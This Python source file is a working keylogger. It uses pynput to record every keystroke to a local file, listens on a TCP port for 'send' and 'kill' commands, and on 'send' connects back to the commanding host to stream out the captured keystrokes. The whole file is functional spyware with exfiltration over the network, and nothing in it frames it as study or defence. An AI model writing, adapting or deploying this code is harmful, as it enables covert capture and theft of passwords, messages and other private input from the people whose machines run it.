from pynput import keyboard
import socket
import os
import threading
import sys
def send_file(addr): #sends a file to a server
    sock = socket.socket() #create a socket object
    sock.connect((addr[0],12345)) # set the sockets address,server will listen at port 12345
    if(os.path.isfile("./out.txt")): #if the desired file exists 
        sock.send(str.encode("Sending file now")) #inform server of intent to send
        text_file = open("out.txt","rb")  # read binary
        payload = text_file.read(1024) #read info from the file in 1024 byte chunks
        while(payload):
            sock.send(payload) #Send this chunk out the socket
            print(payload.decode())
            payload = text_file.read(1024)
        text_file.close()
    else:
        sock.send("file does not exist") # inform server of failure to send
    print("done sending")
def listen_command(): # this will listen for a command from the server to start sending the files
    sock = socket.socket()
    host = ''
    print(host)
    port = 12344
    addr = (host,port) # set up the socket to listen on correct ports
    sock.bind(addr) #bind this. No other program can use this port now
    sock.listen(1) # now listen for a connection
    while True:
        con,addr = sock.accept() #accept the connection
        data = con.recv(1024) #get data
        if(data.decode() == "send"): #if right command
            print("sending file")
            send_file(addr) #send the file
        elif(data.decode() == "kill"): #if the kill command end the program
            print("kill")
            sys.exit()
text_file = open("out.txt", "w")

def key_press(key):
    #keyboard.Key.
    try: #This is the case where they key pressed in an actual character
        print(str.format(key.char))
        text_file.write(str.format(key.char))
        text_file.flush()
    except AttributeError: #These handle any special characters I want to saved differently than just the keypress
        if(key == key.space): #space key becomes space
            print(" ")
            text_file.write(" ")
            text_file.flush()
        elif(key == key.enter): #Enter becomes new line
            print()
            text_file.write("\n")
            text_file.flush()
        elif(key == key.backspace): #backspace become $bs$. I plan to use a parser to build a better text file from this raw output
            text_file.write("$bs$")
            text_file.flush()
        else:
            print(key.name) #Default case is the print the key name

def key_release(key):
    pass #I don't really want to do anything when the key is released 

def main():
    with keyboard.Listener(on_press= key_press, on_release=key_release) as ls: #This is what listens to the keyboard
         #After passing in my functions run using join
        thread = threading.Thread(target=ls.join)
        thread.start()
        listen_command()

main()